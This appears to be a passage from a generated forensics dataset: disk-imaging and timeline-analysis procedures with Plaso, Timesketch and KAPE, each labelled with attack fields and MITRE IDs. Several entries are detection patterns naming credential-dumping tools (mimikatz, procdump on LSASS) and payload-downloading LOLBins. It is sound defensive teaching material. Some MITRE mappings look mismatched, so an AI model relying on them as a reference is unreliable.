- **Scenario**: Forensic team captures encrypted Mac image by unlocking FileVault via user credentials
- **Attack Steps**: 1. Boot Mac into recovery mode (Command + R). 2. Open Terminal and verify disk status: diskutil apfs list. 3. Use user credentials to unlock FileVault volume. 4. Mount the disk read-only: diskutil mountDisk /dev/disk1. 5. Use hdiutil to create encrypted image. 6. Save to external storage with hashes. 7. Document user credentials used (with permission/legal authority). 8. Verify integrity with sha256sum. 9. Note APFS container, logical volume info. 10. Analyze decrypted image in forensic tools.
- **Detection**: Unlock Logs
- **Solution**: Legal process for unlock
- **Tags**: #filevault #macforensics #apfs

## Disk Signature Tampering Detection

- **Attack Type**: Anti-Forensic Evasion
- **Target**: Windows/Linux Disk
- **Vulnerability**: Signature-Level Tampering
- **MITRE**: T1070
- **Impact**: Avoid Detection
- **Tools**: FTK Imager, Hex Editor
- **Scenario**: Analyst detects manipulation in disk signature to evade imaging
- **Attack Steps**: 1. Acquire full disk image. 2. Open image in hex editor and locate MBR (sector 0). 3. Compare disk signature against system records. 4. Identify any changes made to avoid mounting or spoof drives. 5. Cross-reference with logs of system boot errors. 6. Recover true partition info using signature carving tools. 7. Analyze disk for fake partitions or corrupted tables. 8. Use forensic hash verification to confirm image integrity. 9. Document mismatches or missing headers. 10. Report signs of anti-forensic activity.
- **Detection**: MBR Comparison
- **Solution**: Validate MBR/GPT structure
- **Tags**: #diskspoofing #antiforensics #mbr

## Multi-Boot System Imaging and Separation

- **Attack Type**: OS-Specific Partition Imaging
- **Target**: Dual-OS System
- **Vulnerability**: Multi-OS Partitioning
- **MITRE**: T1592
- **Impact**: Cross-OS Persistence
- **Tools**: FTK Imager, fdisk, Autopsy
- **Scenario**: Examiner handles dual-boot system with Windows and Linux, imaging both OS environments
- **Attack Steps**: 1. Identify all partitions with fdisk -l or Disk Management. 2. Create separate logical images for Windows and Linux partitions. 3. Name each image clearly (e.g., win_img.E01, linux_img.E01). 4. Mount each image in respective analysis tools (Autopsy, FTK). 5. Document OS details, bootloader, GRUB entries. 6. Recover deleted files from both systems. 7. Note shared partition usage (e.g., data exchange). 8. Analyze both user and system logs. 9. Hash and store each image separately. 10. Provide combined timeline across both OS events.
- **Detection**: Partition Table Mapping
- **Solution**: Isolate OS environments
- **Tags**: #dualboot #linuxwindows #partitionimaging

## Bit-by-Bit Imaging of Legacy IDE Drive

- **Attack Type**: Legacy System Imaging
- **Target**: IDE Hard Disk
- **Vulnerability**: Legacy Storage Media
- **MITRE**: T1005
- **Impact**: Hardware Decay
- **Tools**: FTK Imager, IDE Adapter
- **Scenario**: Examiner images older IDE hard drive from legacy device using bit-by-bit acquisition
- **Attack Steps**: 1. Use IDE-to-USB adapter to connect legacy drive. 2. Launch FTK Imager and detect IDE device. 3. Select physical drive and start imaging sector-by-sector. 4. Enable hashing and error reporting. 5. Monitor for unreadable sectors (common in old disks). 6. Save image in .E01 with logs. 7. Analyze image with legacy file system viewers (e.g., FAT16). 8. Recover old documents, EXEs, or boot records. 9. Document IDE jumper settings and serial. 10. Archive image as legacy case file.
- **Detection**: Sector Read Logs
- **Solution**: Use adapters cautiously
- **Tags**: #legacyforensics #ide #sectorimaging

## Imaging VirtualBox VDI Disk Format

- **Attack Type**: VM Disk Format Acquisition
- **Target**: VirtualBox VM Disk
- **Vulnerability**: Virtual Disk Formats
- **MITRE**: T1070
- **Impact**: Evidence in Virtual Format
- **Tools**: VBoxManage, FTK Imager
- **Scenario**: Analyst captures and mounts VirtualBox virtual disk (VDI) for forensic analysis
- **Attack Steps**: 1. Locate the .vdi file in the VirtualBox VM folder. 2. Use VBoxManage clonehd to convert VDI to raw: VBoxManage clonehd disk.vdi disk.raw --format RAW. 3. Mount the raw image in forensic tools. 4. Hash the raw disk image. 5. Extract file systems, deleted files, or logs. 6. Check for VM logs (snapshots, sessions). 7. Validate integrity via VBox config files. 8. Document VM name, OS, and settings. 9. Analyze for malware or tampering. 10. Store both VDI and RAW with chain-of-custody.
- **Detection**: File Hashing
- **Solution**: Clone before analysis
- **Tags**: #vdi #virtualbox #vmforensics

## Imaging & Analyzing Remnants from Factory-Reset Disk

- **Attack Type**: Post-Wipe Recovery
- **Target**: Wiped Disk
- **Vulnerability**: Post-Wipe Data Remnants
- **MITRE**: T1070.004
- **Impact**: Anti-Forensics via Wipe
- **Tools**: FTK Imager, PhotoRec, Magnet AXIOM
- **Scenario**: Examiner attempts to recover data from disk that was factory-reset before seizure
- **Attack Steps**: 1. Acquire complete image of the wiped disk. 2. Use data carving tools (PhotoRec, AXIOM) to scan for recoverable data. 3. Search unallocated space for file fragments. 4. Reconstruct PDFs, JPEGs, and Office files from headers. 5. Correlate with known file formats and signatures. 6. Analyze disk slack space and volume shadow copies. 7. Identify signs of wiping tools (e.g., DBAN patterns). 8. Document recoverability metrics (percent restored). 9. Report limitations due to overwriting. 10. Preserve carved files and logs with image.
- **Detection**: Carving + Slack Analysis
- **Solution**: Recover whatever possible
- **Tags**: #postwipe #datarecovery #carving

## Creating a Super Timeline with Plaso

- **Attack Type**: Forensic Analysis
- **Target**: Windows Workstation
- **Vulnerability**: Lack of centralized log correlation
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Enables understanding of full attacker sequence
- **Tools**: Plaso, log2timeline
- **Scenario**: Generating a super timeline from multiple evidence sources to reconstruct attacker activity
- **Attack Steps**: 1. Install Plaso on your analysis workstation.2. Acquire a disk image or mount a forensic copy of the affected drive.3. Run log2timeline.py on the mounted image, targeting /mnt/evidence directory.4. Include artifacts like MFT, $LogFile, Registry Hives, Prefetch, and Event Logs.5. Use psort.py to convert the Plaso storage file into a CSV timeline.6. Open the output CSV in Timeline Explorer or Excel.7. Filter by suspicious timestamps like late-night activity.8. Correlate Prefetch launches with Registry and MFT modifications.9. Mark gaps or spikes in activity.10. Begin forming a hypothesis about the attack timeline.
- **Detection**: Artifact correlation via timestamp analysis
- **Solution**: Generate complete timeline from diverse artifacts
- **Tags**: timeline, plaso, csv, super timeline

## Visualizing a Timeline in Timesketch

- **Attack Type**: Forensic Analysis
- **Target**: Enterprise Endpoint
- **Vulnerability**: No proactive visual timeline
- **MITRE**: T1059 (Command and Scripting Interpreter)
- **Impact**: Provides chronological clarity of attacks
- **Tools**: Plaso, Timesketch
- **Scenario**: Analyst uses Timesketch to visualize attacker behavior across time
- **Attack Steps**: 1. Create a Plaso timeline using log2timeline and store the output.2. Spin up a Timesketch server locally or via Docker.3. Create a new sketch and upload your Plaso output.4. Allow Timesketch to index all entries (may take a while).5. Use the UI to filter by specific keywords like powershell, cmd.exe, or svchost.6. Sort timeline by timestamp and identify burst activity.7. Use tag feature to mark suspicious sequences.8. Build visual storyboards showing attacker steps.9. Export findings to a report.10. Save the sketch as a case artifact.
- **Detection**: UI-based anomaly discovery
- **Solution**: Centralized timeline review
- **Tags**: timesketch, plaso, ui, attacker behavior

## Timeline Anomaly: Bursty File Access Detected

- **Attack Type**: Anomaly Detection
- **Target**: Windows Server
- **Vulnerability**: Lack of DLP monitoring
- **MITRE**: T1113 (Screen Capture), T1005
- **Impact**: Indicates likely data staging event
- **Tools**: KAPE, Plaso, Timeline Explorer
- **Scenario**: IR team detects sudden burst of document access at midnight
- **Attack Steps**: 1. Collect triage image using KAPE and EZTools targets.2. Run log2timeline on the collection folder.3. Convert to CSV using psort.4. Open the CSV in Timeline Explorer.5. Sort by timestamp and apply filters for .docx, .xlsx, and other sensitive formats.6. Detect sudden burst of access from 12:00 AM to 12:10 AM.7. Pivot to Prefetch and MFT artifacts to find the accessing process.8. Discover attacker launched explorer.exe via cmd.exe.9. Use Registry to confirm session time and user account.10. Confirm data staging for exfiltration.
- **Detection**: Filetype + burst time correlation
- **Solution**: Enable DLP, alert on abnormal file access
- **Tags**: anomaly, burst access, timeline, KAPE

## Registry Timeline Correlation

- **Attack Type**: Artifact Correlation
- **Target**: Windows Host
- **Vulnerability**: Registry-based persistence
- **MITRE**: T1547.001
- **Impact**: Reveals attacker foothold mechanism
- **Tools**: Registry Explorer, Plaso
- **Scenario**: Analyst correlates Registry Run keys with Prefetch to identify persistence
- **Attack Steps**: 1. Extract NTUSER.DAT and Software hives from the disk image.2. Use Plaso or Regripper to parse Registry timeline.3. Focus on Run, RunOnce, and StartupApproved keys.4. Overlay Prefetch timeline and identify when those programs executed.5. Identify a malicious executable configured in Run key.6. Notice mismatch between install time and first execution.7. Confirm attacker used Registry for persistence.8. Validate user context and login session via Event Logs.9. Document time gaps between placement and activation.10. Tag as part of persistence phase in the timeline.
- **Detection**: Registry-Prefetch-MFT correlation
- **Solution**: Harden autorun keys, monitor changes
- **Tags**: registry, run key, persistence, correlation

## Time Gap in System Activity Timeline

- **Attack Type**: Anomaly Detection
- **Target**: Endpoint
- **Vulnerability**: Incomplete log visibility
- **MITRE**: T1070.001 (Log Deletion)
- **Impact**: Possible evidence tampering
- **Tools**: Plaso, Timeline Explorer
- **Scenario**: Forensic timeline shows a suspicious 4-hour system inactivity gap
- **Attack Steps**: 1. Run log2timeline on the target system disk image.2. Convert to CSV and load into Timeline Explorer.3. Sort all events by timestamp across all artifacts.4. Identify a clean 4-hour period with zero activity.5. Cross-check against expected business hours.6. Pivot to power logs, session logs, and Registry.7. Confirm system was powered on but no logs were written.8. Hypothesize log tampering or in-memory execution.9. Check for RAM captures or other volatility evidence.10. Mark gap period as potential attacker hideout.
- **Detection**: Time range correlation across logs
- **Solution**: Enhance logging coverage
- **Tags**: time gap, inactivity, log tampering

## Prefetch-Based Timeline Mapping

- **Attack Type**: File System Activity
- **Target**: Windows System
- **Vulnerability**: Lack of process tracking
- **MITRE**: T1059, T1021.002
- **Impact**: Tracks attacker tool execution
- **Tools**: FTK Imager, PECmd
- **Scenario**: Map process execution to timestamps using Prefetch artifacts
- **Attack Steps**: 1. Acquire Prefetch folder from disk image: C:\Windows\Prefetch.2. Use PECmd to parse all .pf files.3. Extract execution timestamps and run counts.4. Identify suspicious binaries with abnormal names or paths.5. Align execution times with user login sessions.6. Match Prefetch evidence with Registry and MFT.7. Detect lateral movement tools like PsExec or RDP wrappers.8. Validate last run time with event logs.9. Build timeline sequence of executed tools.10. Highlight attacker progression via Prefetch history.
- **Detection**: Prefetch + MFT alignment
- **Solution**: Monitor Prefetch for IR
- **Tags**: prefetch, peCmd, execution timeline

## $LogFile Timeline for File Activity

- **Attack Type**: File System Analysis
- **Target**: Windows NTFS Volume
- **Vulnerability**: Hidden file operations
- **MITRE**: T1070.004 (File Deletion)
- **Impact**: Reveals tampering with evidence
- **Tools**: X-Ways, LogFileParser
- **Scenario**: Using NTFS $LogFile to track metadata-level file operations
- **Attack Steps**: 1. Mount disk image with X-Ways.2. Extract $LogFile from NTFS volume.3. Use LogFileParser to convert binary logs into CSV.4. Identify Create, Write, Delete operations by timestamp.5. Correlate access to suspicious directories.6. Compare with user logon timeline.7. Validate usage of renamed tools or alternate data streams.8. Look for spike in delete operations post-compromise.9. Map metadata sequence to malicious behavior.10. Use as supporting evidence in event reconstruction.
- **Detection**: LogFile + timestamp analysis
- **Solution**: Audit file ops via journaling
- **Tags**: logfile, ntfs, file tracking

## Multi-User Timeline Correlation

- **Attack Type**: Timeline Correlation
- **Target**: Internal User Endpoints
- **Vulnerability**: Insider misuse
- **MITRE**: T1081 (Credentials in Files)
- **Impact**: Tracks coordinated insider actions
- **Tools**: Plaso, Timesketch
- **Scenario**: Correlating actions of multiple users to track insider threat
- **Attack Steps**: 1. Collect event logs, MFT, and Registry from all user systems.2. Generate separate timelines using Plaso for each user image.3. Import timelines into Timesketch as separate sketches or timelines.4. Use color-coding to distinguish users.5. Observe shared access to same file at overlapping times.6. Track movements between folders and file ownership.7. Discover after-hours access from one user account.8. Identify internal pivoting behavior.9. Tag sequence as coordinated data staging.10. Export timeline comparison to report.
- **Detection**: Multi-user timeline alignment
- **Solution**: Audit privileged users
- **Tags**: insider, timesketch, multi-user

## Anomaly: Time Stomping Detected in File Timestamps

- **Attack Type**: Anti-Forensics Detection
- **Target**: Windows File System
- **Vulnerability**: Time-stamping obfuscation
- **MITRE**: T1070.006 (Indicator Removal on Host)
- **Impact**: Identifies tampering with forensic data
- **Tools**: MFT, $LogFile, FTK Imager
- **Scenario**: Timeline shows files with creation dates older than image itself
- **Attack Steps**: 1. Acquire full MFT and $LogFile from disk image.2. Load into forensic suite like Autopsy or parse via Plaso.3. Sort by file creation and modification time.4. Detect files with unrealistic timestamps (e.g., 2005 on Win10).5. Check creation date vs image creation date.6. Validate mismatch with $LogFile and shellbags.7. Mark such files as likely time-stomped.8. Pivot to executables and suspicious names.9. Confirm attacker attempting anti-forensic obfuscation.10. Include findings in report as part of evasion technique.
- **Detection**: Timestamp vs system install correlation
- **Solution**: Monitor for timestamp mismatches
- **Tags**: timestomping, evasion, mft

## KAPE Timeline Workflow with EZTools

- **Attack Type**: Timeline Generation
- **Target**: Workstation
- **Vulnerability**: Incomplete triage methods
- **MITRE**: T1082, T1056
- **Impact**: Provides quick initial timeline for IR
- **Tools**: KAPE, EZTools, Timeline Explorer
- **Scenario**: Fast triage-based timeline using KAPE + EZTools + Timeline Explorer
- **Attack Steps**: 1. Prepare a KAPE collection profile with targets like MFT, Registry, Event Logs, SRUM.2. Deploy KAPE to the suspect endpoint or forensic image.3. Collect relevant triage data into one folder.4. Use EZTools like MFTECmd, AppCompatCacheParser to process artifacts.5. Convert output into timeline-friendly CSVs.6. Open Timeline Explorer to load and visualize.7. Sort by user session, time, or file types.8. Detect anomalies like after-hours remote desktop usage.9. Correlate across Registry and SRUM data.10. Archive full timeline as triage artifact.
- **Detection**: SRUM + RDP + Registry triage
- **Solution**: Expand KAPE targets
- **Tags**: kape, eztools, timeline

## Correlating Registry and Event Logs for Lateral Movement

- **Attack Type**: Timeline Correlation
- **Target**: Enterprise Network
- **Vulnerability**: Lack of centralized correlation
- **MITRE**: T1077
- **Impact**: Full compromise of domain environment
- **Tools**: Plaso, Timesketch, RegRipper
- **Scenario**: Analyst investigates lateral movement via correlation of registry Run keys and Event ID 4624
- **Attack Steps**: 1. Use KAPE or Plaso to collect Registry hives and Security.evtx from multiple systems. 2. Parse Registry to extract Run, RunOnce, and Services keys. 3. Extract Event ID 4624 from Security Logs to trace logon sessions. 4. Use Timesketch to visualize the overlap between registry persistence mechanisms and login activity. 5. Correlate time of Run key creation with new logon sessions to detect lateral movement. 6. Identify which accounts were used for the spread. 7. Match new service creation timestamps with registry and logon activity. 8. Document the sequence of attacker movement system to system. 9. Export full correlation graph for case documentation.
- **Detection**: Correlation of multiple timelines from registry and logs
- **Solution**: Enterprise SIEM and centralized logging for better correlation
- **Tags**: registry, timesketch, lateral movement, logon event

## Detecting Data Exfiltration via Compressed Archives

- **Attack Type**: Timeline + File Analysis
- **Target**: Workstation
- **Vulnerability**: Insider threat, lack of DLP
- **MITRE**: T1020
- **Impact**: Possible sensitive data leak
- **Tools**: Plaso, 7-Zip analysis, Timesketch
- **Scenario**: Timeline shows suspicious creation of compressed archives during off-hours
- **Attack Steps**: 1. Extract file creation and access timestamps from NTFS MFT via Plaso. 2. Use Timesketch to isolate creation of .zip, .rar, and .7z files. 3. Filter for large files created during non-business hours. 4. Identify the user account and host where files were created. 5. Cross-reference with Event Logs for USB insertions or FTP/SCP uploads. 6. Check Prefetch to see if compression tools like 7-Zip or WinRAR were run. 7. Document exact files packed into archives via forensic file carving or recovery. 8. Create a timeline overlay to reconstruct potential data staging. 9. Raise alert if files match known sensitive document types or naming conventions.
- **Detection**: File creation time + Prefetch + USB log correlation
- **Solution**: Deploy endpoint monitoring with DLP triggers on archive creation
- **Tags**: exfiltration, archive, zip, night activity

## Identifying Time Stomping in $MFT Timestamps

- **Attack Type**: Anti-Forensics Detection
- **Target**: Windows Workstation
- **Vulnerability**: Time manipulation
- **MITRE**: T1070.006
- **Impact**: Hidden persistence or execution
- **Tools**: Plaso, MFTECmd, Timesketch
- **Scenario**: Attacker tries to hide file creation by modifying timestamps
- **Attack Steps**: 1. Parse MFT using Plaso or MFTECmd to collect all 4 NTFS timestamps. 2. Look for inconsistencies in Created, Modified, Accessed, and Entry Modified values. 3. Use Timesketch to visualize timestamp patterns. 4. Identify files where Entry Modified date is much newer than Created date. 5. Filter for known malware or suspicious file paths (e.g., temp, appdata). 6. Correlate with Prefetch and ShimCache to see actual execution time. 7. Search logs for file system access around true execution window. 8. Use hash comparison to identify tampered files. 9. Document anomalies and add to IOC list.
- **Detection**: Timestamp mismatch analysis
- **Solution**: Use Sysmon and forensic tools that detect tampering
- **Tags**: timestomping, mft, forensics, anti-forensics

## RDP Brute Force Detection via Event ID Clustering

- **Attack Type**: Timeline Analysis
- **Target**: RDP Server
- **Vulnerability**: Weak password, exposed port
- **MITRE**: T1110.001
- **Impact**: Unauthorized access via brute force
- **Tools**: Event Logs, Timesketch, Plaso
- **Scenario**: Detects RDP brute-force attempts using failed logon events clustered in timeline
- **Attack Steps**: 1. Collect Security.evtx from target systems. 2. Parse using Plaso and load into Timesketch. 3. Filter Event ID 4625 (failed login) and group by IP. 4. Identify patterns of repeated failures from the same IP in short bursts. 5. Overlay with Event ID 4624 (successful login) to detect a breach. 6. Check logon types (10 for RDP) to confirm remote login attempt. 7. Document timestamps, IPs, and usernames involved. 8. Correlate with firewall logs or RDP logs for further confirmation. 9. Alert for repeated failures or sudden successful login post-burst.
- **Detection**: Brute force pattern detection in timeline
- **Solution**: Enforce account lockout and RDP rate limiting
- **Tags**: rdp, brute force, 4625, timeline

## Timeline-Based Identification of Credential Dumping Tools

- **Attack Type**: Timeline + Memory
- **Target**: Domain Controller
- **Vulnerability**: Unmonitored LSASS access
- **MITRE**: T1003
- **Impact**: Credential theft and privilege escalation
- **Tools**: Plaso, Prefetch, ShimCache
- **Scenario**: Finds evidence of credential dumping through execution of tools like Mimikatz
- **Attack Steps**: 1. Use Plaso to extract Prefetch entries, especially for mimikatz.exe, procdump.exe, etc. 2. Extract ShimCache (AppCompatCache) from registry hives to get past execution traces. 3. Check Security logs for LSASS process access (Event ID 4673, 4688). 4. Identify execution time of the dumping tool. 5. Cross-reference with account privilege escalation or logon patterns. 6. Confirm whether tool was renamed using hash comparison. 7. Identify file creation time and path of dropped tools. 8. Use timeline overlay to view full attacker activity window. 9. Document each execution and add tool hashes to IOC list.
- **Detection**: LSASS access + suspicious binary execution
- **Solution**: Restrict LSASS access and enable Protected Process Light (PPL)
- **Tags**: mimikatz, dumping, prefetch, shimcache

## USB-Based Data Theft Detection from Timeline Gaps

- **Attack Type**: Anomaly Detection
- **Target**: Endpoint
- **Vulnerability**: Lack of file auditing, USB control
- **MITRE**: T1052.001
- **Impact**: Potential data theft
- **Tools**: Plaso, USBDeview, Event Logs
- **Scenario**: Identifies file access and sudden gap in logs during USB data exfil
- **Attack Steps**: 1. Parse Plaso timeline to extract file access activity. 2. Note timestamps with high file read volume. 3. Detect USB insertions from Event ID 2003 or 2100. 4. Find sudden drop in logging after USB insertion. 5. Correlate file types accessed before gap (e.g., .docx, .xlsx, .pdf). 6. Use USBDeview to get serial ID of connected device. 7. Confirm whether USB device is known/trusted. 8. Raise alert on file access → USB plug → log silence pattern. 9. Document affected user and exported data paths.
- **Detection**: File access + USB + timeline gap correlation
- **Solution**: Enforce USB control policies and file access auditing
- **Tags**: usb, gap, anomaly, file theft

## Browser Activity Timeline Analysis

- **Attack Type**: User Activity
- **Target**: User Workstation
- **Vulnerability**: Lack of browser audit
- **MITRE**: T1217
- **Impact**: Attacker reconnaissance
- **Tools**: Browser History, Plaso
- **Scenario**: Reconstructs attacker’s browsing behavior from browser artifacts
- **Attack Steps**: 1. Extract browser history databases using KAPE or manual collection. 2. Parse using Plaso to obtain Chrome, Edge, or Firefox activity. 3. Analyze visited URLs, download timestamps, and tab activity. 4. Identify suspicious search queries (e.g., “how to bypass EDR”). 5. Filter downloads to detect toolkits or scripts. 6. Cross-reference with Prefetch and process execution data. 7. Build a timeline of research, download, and execution. 8. Detect links to known C2 infrastructure or tool repositories. 9. Document attacker intent and preparation timeline.
- **Detection**: Browser history + Prefetch + file access
- **Solution**: Enable browser telemetry and alert on known C2 hits
- **Tags**: chrome, firefox, browser, recon

## Night-Time Activity Correlation with Event Logs

- **Attack Type**: Anomaly Detection
- **Target**: Corporate Network
- **Vulnerability**: Lack of anomaly baselines
- **MITRE**: T1036.004
- **Impact**: Hidden attacker presence
- **Tools**: Plaso, Event Logs, Timesketch
- **Scenario**: Detects attacker presence by correlating timeline activity during off-hours
- **Attack Steps**: 1. Extract logs and file system metadata with Plaso. 2. Load into Timesketch and filter events between 12am and 5am. 3. Check for file execution, login events, registry modifications. 4. Correlate with known user schedules or working hours. 5. Flag unusual activity like service installs, script execution. 6. Identify tools used during off-hours (from Prefetch or logs). 7. Document full timeline of attacker activity. 8. Use clustering to detect recurring off-hour behavior. 9. Raise anomaly flag based on frequency and type of events.
- **Detection**: Off-hour activity timeline comparison
- **Solution**: Implement baselining of working hours activity
- **Tags**: night activity, anomaly, login, cluster

## Detecting WMI-Based Execution in Timeline

- **Attack Type**: Lateral Movement
- **Target**: Domain Network
- **Vulnerability**: Unmonitored WMI usage
- **MITRE**: T1047
- **Impact**: Remote code execution
- **Tools**: Plaso, WMI Logs, Event Logs
- **Scenario**: Attacker uses WMI for remote code execution across systems
- **Attack Steps**: 1. Parse Event Logs and WMI-Activity logs using Plaso. 2. Look for Event ID 5861, 5860 (WMI consumer/provider). 3. Identify remote execution commands using WMI. 4. Match timestamps with file creation or logon events. 5. Check for unusual process spawn from WmiPrvSE.exe. 6. Use Prefetch and timeline overlay to reconstruct WMI usage. 7. Detect use of PowerShell or cmd via WMI. 8. Correlate with system connections or RDP logons. 9. Build attacker movement chain through WMI timestamps.
- **Detection**: WMI logs + process spawn + timeline view
- **Solution**: Restrict WMI permissions and monitor usage
- **Tags**: wmi, remote exec, timeline, logon

## Sequence Reconstruction of Ransomware Execution

- **Attack Type**: Full Timeline Analysis
- **Target**: Workstation
- **Vulnerability**: Unpatched system, phishing entry
- **MITRE**: T1486
- **Impact**: File loss, system lockout
- **Tools**: Plaso, Timesketch, Event Logs
- **Scenario**: Reconstructs entire ransomware deployment and encryption path
- **Attack Steps**: 1. Use Plaso to extract Prefetch, logs, file system metadata. 2. Identify initial execution of ransomware binary. 3. Detect creation of ransom note files across directories. 4. Look for spike in file rename operations and extension changes. 5. Analyze Event Logs for shadow copy deletion (Event ID 524). 6. Identify process tree of the ransomware executable. 7. Track file encryption timestamps by folder. 8. Rebuild full sequence from execution to ransom display. 9. Present visualization in Timesketch for IR reporting.
- **Detection**: File extension changes + ransom notes
- **Solution**: Patch systems and backup strategy
- **Tags**: ransomware, encryption, timeline, shadowcopy

## Timeline Detection of LOLBins Abuse

- **Attack Type**: Living Off The Land
- **Target**: Windows Workstation
- **Vulnerability**: Built-in tool abuse
- **MITRE**: T1218
- **Impact**: Stealthy execution and evasion
- **Tools**: Plaso, Timesketch, Event Logs
- **Scenario**: Attacker uses built-in Windows tools (e.g., bitsadmin, mshta) for malicious activity
- **Attack Steps**: 1. Collect Prefetch, process creation logs, and event logs using KAPE or Plaso. 2. Search timeline for known LOLBins like bitsadmin, certutil, mshta, regsvr32. 3. Identify command-line arguments to detect suspicious use (e.g., downloading payloads). 4. Cross-reference with file creation events to check for dropped files. 5. Check timeline alignment between LOLBin execution and network access. 6. Use Timesketch to visualize the order of events and context. 7. Document use of signed binaries for unauthorized tasks. 8. Flag abuse of system tools for lateral movement or persistence. 9. Correlate with hash analysis to verify binaries weren't replaced.
- **Detection**: Timeline + command-line + process correlation
- **Solution**: Alert on uncommon LOLBin usage patterns
- **Tags**: lolbins, regsvr32, certutil, bitsadmin

## Reconstruction of Attacker Recon via File Access

- **Attack Type**: File Access Timeline
- **Target**: Corporate File Server
- **Vulnerability**: Weak access control auditing
- **MITRE**: T1083
- **Impact**: Recon before data theft
- **Tools**: Plaso, FTK Imager
- **Scenario**: Tracks attacker reconnaissance by analyzing file access and reads before exfiltration
- **Attack Steps**: 1. Use Plaso to extract file system metadata and access logs. 2. Isolate file access timestamps within the suspected breach window. 3. Look for patterns where many sensitive files (e.g., finance, HR) were opened but not modified. 4. Identify user account used to access these files. 5. Compare to normal access patterns for that user. 6. Map timeline of file reads leading to exfiltration tools (e.g., archive creation). 7. Cross-reference with USB or network upload evidence. 8. Document full path of accessed files and access timestamps. 9. Provide behavioral context to support insider or external attribution.
- **Detection**: File access frequency + read-only patterns
- **Solution**: Enable detailed file access logging
- **Tags**: file read, reconnaissance, file server

## Anomalous PowerShell Timeline Activity Detection

- **Attack Type**: Scripting Abuse
- **Target**: Domain-Joined Hosts
- **Vulnerability**: Overuse of scripting without restrictions
- **MITRE**: T1059.001
- **Impact**: Remote code execution or credential access
- **Tools**: Event Logs, Plaso, PowerShell Logs
- **Scenario**: Detects attacker use of PowerShell via abnormal usage patterns in timeline
- **Attack Steps**: 1. Enable PowerShell transcription logging and collect logs. 2. Use Plaso to parse PowerShell logs and Event ID 4104/4688. 3. Identify scripts with encoded commands or network activity. 4. Plot script executions in timeline to check for off-hours usage. 5. Correlate with user logon sessions to detect impersonation. 6. Investigate command content for download, decode, or execution functions. 7. Check against known PowerShell abuse techniques. 8. Document IPs or domains contacted by PowerShell scripts. 9. Raise alert if PowerShell is used outside standard IT hours or from unusual users.
- **Detection**: Command content + time of execution
- **Solution**: Restrict PowerShell usage and log deeply
- **Tags**: powershell, scripting, 4104, anomaly

## Timeline Analysis of Logon Type Anomalies

- **Attack Type**: Logon Behavior
- **Target**: Enterprise Network
- **Vulnerability**: Misused service accounts or credential theft
- **MITRE**: T1078
- **Impact**: Unauthorized remote access
- **Tools**: Event Logs, Plaso, Timesketch
- **Scenario**: Detects anomalies in logon types (e.g., Type 10 for RDP) through timeline clustering
- **Attack Steps**: 1. Collect Security.evtx and parse via Plaso. 2. Focus on Event ID 4624 with associated Logon Type fields. 3. Group successful logins by type (2 = console, 3 = network, 10 = RDP). 4. Use Timesketch to visualize login patterns and cluster by time. 5. Highlight rare or new logon types per user or machine. 6. Correlate with IP addresses and hostname involved. 7. Flag RDP usage during strange hours or from unknown locations. 8. Check for use of service accounts with interactive logons. 9. Document full logon timeline and suspicious trends.
- **Detection**: Logon clustering + anomaly detection
- **Solution**: Audit logon types per user/machine baseline
- **Tags**: 4624, rdp, logon type, timesketch

## Registry Modification Detection in LNK Hijacking

- **Attack Type**: Persistence Mechanism
- **Target**: Windows Host
- **Vulnerability**: Unmonitored registry changes
- **MITRE**: T1546.001
- **Impact**: Persistent malware through shortcut abuse
- **Tools**: Plaso, Registry Viewer, Timesketch
- **Scenario**: Attacker sets malicious .lnk file handler via registry; timeline reveals modification
- **Attack Steps**: 1. Use KAPE to collect registry hives (NTUSER.dat and SOFTWARE). 2. Parse with Plaso and load into Timesketch. 3. Search for changes in .lnk file association under HKCU\Software\Classes. 4. Identify command paths pointing to malicious payloads. 5. Align registry modification timestamp with file creation events. 6. Look for .lnk files dropped around same time in common folders. 7. Verify presence of persistence through reboot or logon scripts. 8. Document file path, registry key modified, and execution timestamp. 9. Add modified key and executable to IOC list.
- **Detection**: Registry change + file drop timestamp
- **Solution**: Monitor registry for shell handler changes
- **Tags**: lnk, registry hijack, persistence, plaso

## Process Injection Timeline Detection Using Execution Gaps

- **Attack Type**: Code Injection
- **Target**: Endpoint or Server
- **Vulnerability**: Memory injection without child process logs
- **MITRE**: T1055
- **Impact**: Stealthy execution and evasion
- **Tools**: Plaso, Volatility, Event Logs
- **Scenario**: Timeline reveals gap between parent-child process and memory injection
- **Attack Steps**: 1. Extract Event ID 4688 for process creation and use Plaso to parse. 2. Identify parent-child relationship mismatches in execution timestamps. 3. Look for sudden appearance of malicious child process with no matching parent. 4. Correlate with Volatility memory image (if available) to confirm injection (e.g., malfind). 5. Check if injected process spawned network connections or accessed LSASS. 6. Use timeline to reconstruct exact second of injection activity. 7. Compare hash and path of process to known good versions. 8. Document injection path and affected host. 9. Add injected DLLs and process behavior to detection rules.
- **Detection**: Execution timestamp gaps + memory analysis
- **Solution**: Implement EDR with memory scanning
- **Tags**: injection, dll, process gap, memory

## Timeline Analysis of Attacker File Deletion

- **Attack Type**: Anti-Forensics
- **Target**: Endpoint
- **Vulnerability**: Lack of file recovery methods
- **MITRE**: T1070.004
- **Impact**: Obfuscation and cleanup
- **Tools**: Plaso, Shadow Explorer, Timesketch
- **Scenario**: Tracks attacker attempts to cover tracks via file deletion post-execution
- **Attack Steps**: 1. Use Plaso to extract file deletion metadata from $LogFile and USN Journal (if present). 2. Identify deleted files during or after attack window. 3. Check execution timeline of dropped binaries, then deletion events. 4. Correlate with Event Logs or Prefetch to confirm if binary was executed. 5. Attempt file recovery via shadow copies or carving. 6. Document which tools were deleted and when. 7. Identify attacker strategy for cleanup (manual or scripted). 8. Add recovered binaries to YARA or hash list. 9. Use timeline to explain anti-forensic behavior during IR reporting.
- **Detection**: Deletion + execution pattern analysis
- **Solution**: Enable shadow copy and journaling
- **Tags**: anti-forensics, deletion, shadowcopy

## Service Creation Detection via Timeline + Event Log

- **Attack Type**: Persistence Technique
- **Target**: Windows Server
- **Vulnerability**: Unmonitored service installs
- **MITRE**: T1543.003
- **Impact**: Persistent backdoor or payload
- **Tools**: Event Logs, Plaso, Timesketch
- **Scenario**: Detects attacker installing malicious service to maintain persistence
- **Attack Steps**: 1. Extract Event ID 7045 (service install) from System.evtx. 2. Use Plaso to parse logs and correlate service creation time. 3. Identify service name, binary path, and user who installed. 4. Cross-reference with Prefetch and file creation metadata. 5. Use Timesketch to visualize when the service was created and executed. 6. Flag services with uncommon names or stored in suspicious paths. 7. Check service configuration (auto start, user context). 8. Document persistence method and potential malware behavior. 9. Add service binary to analysis sandbox.
- **Detection**: 7045 + binary metadata + timeline
